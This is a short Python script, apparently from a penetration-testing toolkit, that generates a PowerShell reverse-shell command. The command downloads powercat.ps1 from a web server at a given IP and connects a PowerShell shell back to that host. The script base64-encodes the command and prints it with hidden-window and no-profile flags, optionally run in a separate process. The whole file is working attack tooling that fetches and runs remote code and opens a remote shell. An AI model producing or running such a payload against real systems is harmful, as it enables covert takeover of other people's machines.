#!/usr/bin/python3
from base64 import b64encode

def generate_payload(ip: str, port: int, webport: int):
    payload = f"IEX (New-Object System.Net.Webclient).DownloadString(\"http://{ip}:{webport}/windows/powercat.ps1\");"
    payload += f"powercat -c {ip} -p {port} -e powershell"
    return payload

if __name__ == "__main__":
    from lib.prog import *
    prog = Prog(
        "gen_pwsh_rshell",
        "Runs a download cradle for a Powercat reverse shell. Assumes you're using the webserver in the ./http directory.", [
            Arg(ArgType.POSITIONAL, "ip", arg_val_type=str, arg_help="IP address of reverse shell"),
            Arg(ArgType.POSITIONAL, "port", arg_val_type=int, arg_help="Port of reverse shell"),
            Arg(ArgType.POSITIONAL, "webport", arg_val_type=int, arg_help="Port of web server hosting powercat"),
            Arg(ArgType.OPTIONAL_FLAG, "fork", "f", arg_val_type=bool, arg_help="Whether or not the reverse shell should be run in a new process")
        ]
    )
    payload = generate_payload(prog.args["ip"], int(prog.args["port"]), int(prog.args["webport"]))
    payload_b = payload.encode("utf-16le")  # pwsh uses utf-16 little endian
    payload_enc = b64encode(payload_b).decode()

    args = f"-nop -w Hidden -enc {payload_enc}"

    to_fork = False
    if prog.args["fork"] is not None:
        to_fork = prog.args["fork"]

    if to_fork:
        print(f"powershell.exe start-process powershell.exe -ArgumentList '{args}'")
    else:
        print(f"powershell.exe {args}")
    
